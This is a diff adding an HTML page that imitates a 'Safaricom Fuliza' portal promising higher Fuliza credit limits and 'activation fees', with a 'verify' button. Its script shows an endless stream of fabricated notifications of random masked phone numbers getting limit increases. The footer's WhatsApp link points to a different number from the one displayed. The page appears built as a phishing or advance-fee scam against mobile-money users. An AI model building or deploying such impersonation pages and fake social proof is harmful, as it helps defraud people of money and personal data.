@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Safaricom Fuliza Portal</title>
+<link rel="stylesheet" href="style.css">
+<style>
+/* HERO SECTION */
+.hero{
+  background:white;
+  text-align:center;
+  padding:25px 15px;
+  max-width:450px;
+  margin:20px auto;
+  border-radius:15px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.08);
+}
+
+.hero h1 {
+  font-size:28px;
+  color:#1fb141;
+  margin-bottom:15px;
+}
+
+.hero p {
+  color:#555;
+  margin-bottom:40px;
+}
+.hero img{
+  width:100%;
+  max-width:300px;
+  height:auto;
+  display:block;
+  margin:0 auto 20px auto;
+  border-radius:20px;
+}
+
+.btn {
+  background:#1fb141;
+  color:white;
+  padding:12px 30px;
+  border-radius:30px;
+  text-decoration:none;
+  font-weight:bold;
+  display:inline-block;
+  font-size:18px;
+  position: relative;
+  transition: transform 0.2s ease;
+}
+
+/* Button shake animation */
+@keyframes shakeButton {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-4px); }
+  40% { transform: translateX(4px); }
+  60% { transform: translateX(-4px); }
+  80% { transform: translateX(4px); }
+  100% { transform: translateX(0); }
+}
+
+.btn.shake {
+  animation: shakeButton 1.2s infinite;
+}
+
+.btn:hover {
+  background:#169c37;
+  transform: scale(1.05);
+}
+
+/* Animated Hand */
+.hand-wrapper {
+  position: absolute;
+  left: 50%;
+  bottom: -50px;
+  transform: translateX(-50%);
+}
+
+.hand {
+  width:40px;
+  height:40px;
+  animation: bounceHand 1.2s infinite;
+  transform-origin: bottom center;
+}
+
+@keyframes bounceHand {
+  0%   { transform: translateY(0px) rotate(0deg); }
+  25%  { transform: translateY(-8px) rotate(-5deg); }
+  50%  { transform: translateY(-12px) rotate(5deg); }
+  75%  { transform: translateY(-8px) rotate(-5deg); }
+  100% { transform: translateY(0px) rotate(0deg); }
+}
+
+/* SERVICES CARD */
+.card {
+  background:white;
+  margin:25px;
+  padding:25px;
+  border-radius:12px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.08);
+  text-align:center;
+}
+
+.card h2 {
+  color:#1fb141;
+  margin-bottom:10px;
+}
+
+.card p {
+  color:#555;
+}
+
+/* FOOTER */
+.footer {
+  background:#1fb141;
+  color:white;
+  padding:25px 20px;
+  text-align:center;
+  margin-top:40px;
+  border-radius:10px 10px 0 0;
+}
+
+.footer a {
+  color:white;
+  margin:0 10px;
+  text-decoration:underline;
+  font-size:14px;
+}
+
+.footer p {
+  margin-top:10px;
+  font-size:14px;
+  color:white;
+}
+/* TOP SLIDE NOTIFICATION */
+#popup {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background: white;
+  border-bottom: 3px solid #1fb141;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  display: flex;
+  align-items: center;
+  padding: 12px;
+  z-index: 9999;
+
+  transform: translateY(-100%);
+  transition: transform 0.5s ease;
+}
+
+#popup.show {
+  transform: translateY(0);
+}
+
+.popup-avatar {
+  width: 40px;
+  height: 40px;
+  background: #1fb141;
+  color: white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-right: 12px;
+  font-weight: bold;
+}
+
+.popup-content {
+  font-size: 14px;
+}
+
+#popup-time {
+  font-size: 12px;
+  color: gray;
+  }
+
+
+/* TOP BAR BRAND */
+.topbar {
+  background:#1fb141;
+  padding:20px;
+  text-align:center;
+  font-size:22px;
+  color:white;
+  font-weight:bold;
+  border-radius:0 0 12px 12px;
+}
+
+@media(max-width:600px){
+  .hero, .card {
+    margin:15px;
+    padding:20px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<!-- Top brand only -->
+<header class="topbar">
+  Safaricom Fuliza Increasement Portal
+</header>
+
+  <div id="popup">
+  <div class="popup-avatar">A</div>
+  <div class="popup-content">
+    <div id="popup-text"></div>
+    <div id="popup-time"></div>
+  </div>
+  </div>
+
+<section class="hero">
+
+  <img src="logo.png" alt="Fuliza Banner">
+
+  <h1>Increase Your Fuliza Limit Online</h1>
+  <p>Check balances, view limits, pay activation fees, and manage your services easily.</p>
+  
+  <!-- Button -->
+  <a href="verify.html" class="btn shake">Increase Your Limit</a>
+</section>
+
+<section class="card">
+  <h2>Discover Our Services</h2>
+  <p>Access your account, pay fees, track transactions, and manage services anytime with convenience and security.</p>
+</section>
+
+<footer class="footer">
+  <div>
+    <a href="terms.html">Terms & Conditions</a> |
+    <a href="privacy.html">Privacy Policy</a> |
+    <a href="support.html">Support</a>
+  </div>
+  <p>© 2026 Safaricom Fuliza Portal. For assistance, contact us at <a href="https://wa.me/254108808451" target="_blank">WhatsApp +254 722 000 000</a></p>
+</footer>
+  <script>
+const popup = document.getElementById("popup");
+const text = document.getElementById("popup-text");
+const timeEl = document.getElementById("popup-time");
+const avatar = document.querySelector(".popup-avatar");
+
+/* SAFARICOM PREFIXES ONLY */
+const prefixes = ["070","071","072","074","079","076","079","011"];
+
+/* GENERATE SAFARICOM NUMBER */
+function randomPhone() {
+  let prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+  let middle = Math.floor(100000 + Math.random() * 900000); // 6 digits
+  let last = Math.floor(10 + Math.random() * 90); // last 2 digits
+
+  return prefix + middle.toString().slice(0,3) + "***" + last;
+}
+
+/* REALISTIC AMOUNT */
+function randomAmount() {
+  return Math.floor(Math.random() * 85000) + 8000;
+}
+
+/* REALISTIC TIME */
+function randomTime() {
+  const times = ["just now","30 secs ago","1 min ago","2 mins ago"];
+  return times[Math.floor(Math.random() * times.length)];
+}
+
+/* RANDOM LETTER AVATAR */
+function randomLetter() {
+  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  return letters[Math.floor(Math.random() * letters.length)];
+}
+
+/* ACTION TEXTS */
+const actions = [
+  "boosted to",
+  "limit increased to",
+  "approved for",
+  "updated to",
+  "successfully raised to"
+];
+
+/* SHOW POPUP */
+function showPopup() {
+  const phone = randomPhone();
+  const amount = randomAmount();
+  const action = actions[Math.floor(Math.random() * actions.length)];
+
+  text.innerText = `${phone} ${action} Ksh ${amount.toLocaleString()}`;
+  timeEl.innerText = randomTime();
+  avatar.innerText = randomLetter();
+
+  popup.classList.add("show");
+
+  // hide after 3.5s
+  setTimeout(() => {
+    popup.classList.remove("show");
+  }, 3500);
+}
+
+/* LOOP WITH RANDOM DELAY */
+function loop() {
+  showPopup();
+  setTimeout(loop, Math.random() * 3000 + 4000); // 4–7 sec
+}
+
+/* START */
+loop();
+  </script>
+
+</body>
+</html>
